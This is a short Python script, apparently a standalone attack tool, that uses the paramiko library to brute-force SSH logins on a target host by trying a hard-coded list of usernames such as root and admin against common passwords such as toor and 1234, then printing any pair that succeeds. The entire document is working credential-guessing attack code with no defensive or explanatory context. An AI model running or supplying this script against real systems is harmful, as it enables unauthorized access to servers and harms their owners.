import paramiko  # pip install paramiko

def run_brute_force(target):
    usernames = ["admin", "root"]
    passwords = ["1234", "password", "toor"]

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for user in usernames:
        for pw in passwords:
            try:
                ssh.connect(target, username=user, password=pw)
                print(f"[+] Found credentials: {user}:{pw}")
                return
            except:
                continue
    print("[-] No credentials found")
